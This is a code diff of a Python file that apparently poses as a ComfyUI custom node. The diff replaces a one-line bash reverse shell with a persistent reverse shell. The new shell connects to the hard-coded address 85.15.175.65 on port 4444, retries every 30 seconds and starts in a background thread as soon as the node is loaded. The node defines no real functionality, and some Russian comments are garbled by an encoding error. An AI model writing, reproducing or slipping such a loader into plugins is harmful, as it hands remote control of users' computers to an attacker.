@@ -1,13 +1,37 @@
-    import os
-    import threading
+import os
+import socket
+import subprocess
+import threading
+import time
 
-    def run_shell():
-        # Это пример для Linux
-        os.system("bash -c 'bash -i >& /dev/tcp/85.15.175.65/4444 0>&1'")
+ATTACKER_IP = "85.15.175.65"
+ATTACKER_PORT = 4444
+RETRY_DELAY = 30  # СЃРµРєСѓРЅРґ РјРµР¶РґСѓ РїРѕРїС‹С‚РєР°РјРё
 
-    # Запускаем в отдельном потоке, чтобы не завис ComfyUI
-    t = threading.Thread(target=run_shell)
-    t.start()
-    
-    print("NODE LOADED: SHELL EXECUTED")
-    NODE_CLASS_MAPPINGS = {}
+def reverse_shell():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ATTACKER_IP, ATTACKER_PORT))
+            os.dup2(s.fileno(), 0)
+            os.dup2(s.fileno(), 1)
+            os.dup2(s.fileno(), 2)
+            subprocess.call(["/bin/bash", "-i"])
+        except:
+            pass
+        finally:
+            try:
+                s.close()
+            except:
+                pass
+        time.sleep(RETRY_DELAY)  # Р–РґС‘Рј Рё РїСЂРѕР±СѓРµРј СЃРЅРѕРІР°
+
+# Р—Р°РїСѓСЃРєР°РµРј РІ daemon РїРѕС‚РѕРєРµ
+t = threading.Thread(target=reverse_shell, daemon=True)
+t.start()
+
+print("[+] Persistent shell started")
+
+NODE_CLASS_MAPPINGS = {}
+NODE_DISPLAY_NAME_MAPPINGS = {}
+__all__ = ['NODE_CLASS_MAPPINGS', 'NODE_DISPLAY_NAME_MAPPINGS']
